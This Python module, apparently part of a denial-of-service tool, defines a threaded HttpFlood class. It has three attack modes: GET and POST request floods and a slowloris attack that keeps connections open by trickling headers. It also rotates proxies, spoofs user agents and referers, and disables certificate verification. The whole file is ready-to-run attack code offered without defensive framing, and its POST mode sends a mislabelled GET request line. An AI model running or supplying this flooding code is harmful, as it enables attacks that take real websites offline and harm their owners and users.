import socket
import random
import time
import ssl
from threading import Thread, Event
from urllib import parse

import certifi

from .utils import Colors


SSL_CTX = ssl.create_default_context(cafile=certifi.where())
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE


class HttpFlood(Thread):
    def __init__(self, thread_id, target, host, method="GET", rpc=1, synevent=None,
                 useragents=None, referers=None, proxies=None):
        Thread.__init__(self, daemon=True)
        self._tid = thread_id
        self._target = target
        self._host = host
        self._method = method
        self._rpc = rpc
        self._synevent = synevent
        self._proxies = list(proxies) if proxies else None
        self._raw_target = (host, target.port or 80)
        self._useragents = list(useragents) if useragents else [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        self._referers = list(referers) if referers else [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://search.yahoo.com/",
        ]
        self._is_https = target.scheme.lower() == "https"

    def run(self):
        if self._synevent:
            self._synevent.wait()
        methods = {
            "GET": self.http_get,
            "POST": self.http_post,
            "SLOW": self.slowloris,
        }
        fn = methods.get(self._method, self.http_get)
        while self._synevent and self._synevent.is_set():
            fn()

    def _connect(self):
        if self._proxies:
            s = random.choice(self._proxies).open_socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.settimeout(0.9)
        s.connect(self._raw_target)
        if self._is_https:
            s = SSL_CTX.wrap_socket(s, server_hostname=self._host,
                                    server_side=False, do_handshake_on_connect=True)
        return s

    def _headers(self, extra=None):
        ua = random.choice(self._useragents)
        ref = random.choice(self._referers)
        h = (f"GET {self._target.raw_path_qs} HTTP/1.1\r\n"
             f"Host: {self._target.authority}\r\n"
             f"User-Agent: {ua}\r\n"
             f"Referer: {ref}\r\n"
             f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
             f"Accept-Language: en-US,en;q=0.5\r\n"
             f"Accept-Encoding: gzip, deflate\r\n"
             f"Connection: keep-alive\r\n")
        if extra:
            h += extra
        h += "\r\n"
        return h.encode()

    def http_get(self):
        try:
            s = self._connect()
            payload = self._headers()
            for _ in range(self._rpc):
                s.send(payload)
            s.close()
        except Exception:
            pass

    def http_post(self):
        try:
            s = self._connect()
            data = f"data={random.randbytes(32).hex()}"
            extra = (f"Content-Type: application/x-www-form-urlencoded\r\n"
                     f"Content-Length: {len(data)}\r\n\r\n{data}")
            payload = self._headers(extra)
            for _ in range(self._rpc):
                s.send(payload)
            s.close()
        except Exception:
            pass

    def slowloris(self):
        try:
            s = self._connect()
            payload = (f"GET /?{random.randint(1, 999999)} HTTP/1.1\r\n"
                       f"Host: {self._target.authority}\r\n"
                       f"User-Agent: {random.choice(self._useragents)}\r\n"
                       f"Accept-language: en-US,en,q=0.5\r\n"
                       f"Connection: keep-alive\r\n").encode()
            s.send(payload)
            while self._synevent and self._synevent.is_set():
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                time.sleep(10)
            s.close()
        except Exception:
            pass